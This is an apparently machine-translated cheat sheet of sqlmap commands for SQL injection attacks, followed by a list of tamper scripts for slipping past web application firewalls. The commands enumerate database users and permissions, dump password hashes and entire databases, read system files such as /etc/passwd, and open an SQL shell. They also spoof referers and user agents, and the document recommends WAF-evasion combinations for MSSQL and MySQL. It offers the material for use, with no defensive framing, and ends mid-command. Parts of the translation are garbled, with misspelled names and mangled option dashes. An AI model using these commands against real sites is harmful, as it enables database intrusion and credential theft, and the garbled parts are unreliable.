SQL injection vulnerability.

1.Analyzing the current user is dba
python sqlmap.py -u “url” –is-dba -v 1
2) — users: user list database management system
python sqlmap.py -u “url” –users -v 0
3) — passwords: Database user password (hash)
python sqlmap.py -u “url” –passwords -v 0
python sqlmap.py -u “url” –passwords -U sa -v 0
4) To view the user permissions
python sqlmap.py -u “url” –privileges -v 0
python sqlmap.py -u “url” –privileges -U postgres -v 0
5) — dbs can use the database
python sqlmap.py -u “url” –dbs -v 0
6) — tables column in a table
python sqlmap.py -u “url” –tables -D “information_scheam”
-D: Specifies the name of the data
7) — columns are listed in the table column names
python sqlmap.py -u “url” –columns -T “user” -D “mysql” -v 1
-T: Specify the table name, -D: Specifies the library name
8) — dump the contents of the column specified in the list
python sqlmap.py -u “url” –dump -T “users” -D “testdb”
-C: You can specify fields
The specified column in the range of 2-4
python sqlmap.py -u “url” –dump -T “users” -D “testdb” –start 2 –stop 4 -v 0
9) — dumap-all List all databases, all tables content
python sqlmap.py -u “url” –dump-all -v 0
Only lists the contents of the user’s own new database and tables
python sqlmap.py -u “url” –dump-all –exclude-sysdbs -v 0
10) — file to read the content of the document [load_file () function]
python sqlmap.py -u “url” –file / etc / password
11) execute SQL
python sqlmap.py -u “url” –sql-shell
12) -p parameter specified
python sqlmap.py -u “url” -v 1 -p “id”
You can specify multiple -p parameter -p “cat, id”
13) POST submission
python sqlmap.py -u “url” –method POST –data “id = 1”
14) COOKIE Submit
python sqlmap.py -u “url” –cookie “id = 1” -v 1
cookie value can be crawled by the TamperData
15) refer to deceive
python sqlmap.py -u “url” –refer “url” -v 3
16) using a custom user-agent or user-agents.txt
python sqlmap.py -u “url” –user-agent “Mozilla / 4.0 (compatible; MSIE 7.0; Windows NT 5.1)” -v 3
python sqlmap.py -u “url” -v 1 -a “./txt/user-agents.txt”
17) use of multithreading guess solution
python sqlmap.py -u “url” -v 1 –current-user –threads 3
18) specify the database, bypassing the automatic detection SQLMAP
python sqlmap.py -u “url” -v 2 –dbms “PostgreSQL”
19) Specifies the operating system automatically detects the bypass SQLMAP
python sqlmap.py -u “url” -v 2 –os “Windows”
20) — prefix and –postfix custom payload
python sqlmap.py -u “url” -v 3 -p “id” –prefix ” ‘” –postfix “and’ test ‘=’ test”
21) union injection test
python sqlmap.py -u “url” –union-test -v -1
22) with the order by
python sqlmap.py -u “url” –union-test –union-tech orderby -v 1
23) python sqlmap.py -u “url” -v 1 –union-use –banner
24) python sqlmap.py -u “url” -v 5 –union-use –current-user
25) python sqlmap.py -u “url” -v 1 –union-use –dbs

 tamper injection data

    apostrophemask.py replace single quote character in UTF-8-byte characters
    apostrophenullencode.py replace single-quote character with an illegal double-byte Unicode characters
    appendnullbyte.py, add a null character at the end of payload encoding
    base64encode.py use Base64 encoding for a given payload all characters
    between.py, “the BETWEEN the AND # #” is replaced with “NOT BETWEEN 0 AND #” replace greater-than sign “>” equal sign “=”
    bluecoat.py After the SQL statements replace spaces with valid random whitespace, followed by “the LIKE” Alternatively equal sign “=”
    chardoubleencode.py use double URL encoding for a given payload all characters (not handle characters already encoded)
    charencode.py use URL encoding for a given payload all characters (not handle characters already encoded)
    charunicodeencode.py use Unicode URL encoding for a given payload of non-coded character (the character does not handle already encoded)
    concat2concatws.py with Examples “CONCAT_WS (MID (CHAR (0 ), 0, 0), A, B)” replacement image “CONCAT (A, B)” is
    equaltolike.py with “the LIKE” operator replace all equal sign “=”
    greatest.py Alternatively greater than “>” use “GREATEST” function
    halfversionedmorekeywords.py add MySQL comments before each keyword
    ifnull2ifisnull.py with “IF (ISNULL (A), B, A)” replacement image “IFNULL (A, B)” Examples
    lowercase.py replace the value of each keyword character lowercase
    modsecurityversioned.py surrounded by complete query with a comment
    modsecurityzeroversioned.py comments with zero digits of which is surrounded by a full inquiry
    multiplespaces.py add more spaces around SQL keywords
    nonrecursivereplacement.py replace the predefined keywords using SQL representations, a filter suitable for
    overlongutf8.py conversion to all characters in a given payload among
    percentage.py add a percent sign before each character
    randomcase.py random character case conversion for each keyword
    randomcomments.py insert random comments to SQL keywords
    securesphere.py add the string through a special configuration
    sp_password.py Appends ‘sp_password’ to the end of the payload for automatic obfuscation from DBMS logs
    space2comment.py replace spaces with “/ ** /”
    space2dash.py dash comment character “-” followed by a linefeed a random string of characters and replace the space character
    space2hash.py pounds comment character “#” followed by a linefeed a random string of characters and replace the space character
    space2morehash.py pounds comment character “#” followed by a linefeed a random string of characters and replace the space character
    space2mssqlblank.py replace spaces with a set of valid candidate among the set of random character whitespace
    space2mssqlhash.py pounds comment symbol “#” followed by a space character to replace newline
    space2mysqlblank.py replace spaces with a set of valid candidate among the set of random character whitespace
    space2mysqldash.py dash comment character “-” followed by a linefeed character replace spaces
    space2plus.py a plus “+” with spaces
    space2randomblank.py replace spaces with a set of valid candidate among the set of random character whitespace
    unionalltounion.py Replaces UNION ALL SELECT with UNION SELECT
    unmagicquotes.py use a combination of multi-byte% bf% 27 and the end of general note replaced with spaces
    varnish.py add an HTTP header “X-originating-IP” to bypass WAF
    versionedkeywords.py surrounding each non-comment function key with MySQL
    versionedmorekeywords.py surrounded by each keyword with a MySQL Notes
	
Usage

MSSQL:
    tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes

MySQL:
     tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor

General Tamper testing:
    tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes

Example:
    sqlmap -u ‘http://www.site.com:80/search.cmd?form_state=1’ –level=5 –risk=3 -p ‘item1’ –tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleen